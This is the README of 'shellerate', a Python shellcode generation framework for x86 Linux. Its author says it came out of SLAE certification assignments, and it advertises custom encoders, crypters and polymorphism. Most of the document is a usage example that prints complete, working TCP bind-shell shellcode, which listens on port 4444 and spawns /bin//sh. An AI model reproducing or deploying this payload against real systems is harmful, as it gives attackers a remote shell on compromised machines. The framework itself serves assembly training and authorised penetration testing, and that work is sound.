# Shellerate

## Introduction

This the Changelog file for the shellerate project. 'shellerate' is pun between
'shell' and 'scellerato', the Italian word for 'wicked'.

'shellerate' is a shellcode generation framework born from the assignments I
took for the SecurityTube Linux Assembly Expert certification process.

You can feature custom encoders, custom crypters, polymorphism and all stuff I
learnt in the SLAE certification process.

shellerate is Python3 package and supported architectures and operating system
are limited to:

* x86/Linux

## Installation

To install shellerate to your system you can issue the following command:

> pip install shellerate

## Available payloads

### TCP Bind shell shellcode

```python
from shellerate.bind_shellcode import *
b=BindShellcode(4444, 'x86', 'linux')
b.generate()
b.shellcode
'\\x31\\xc0\\x89\\xc3\\x89\\xc1\\x89\\xc2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xc9\\x51\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x51\\x89\\xce\\x89\\xe1\\x89\\xe2\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80'
```


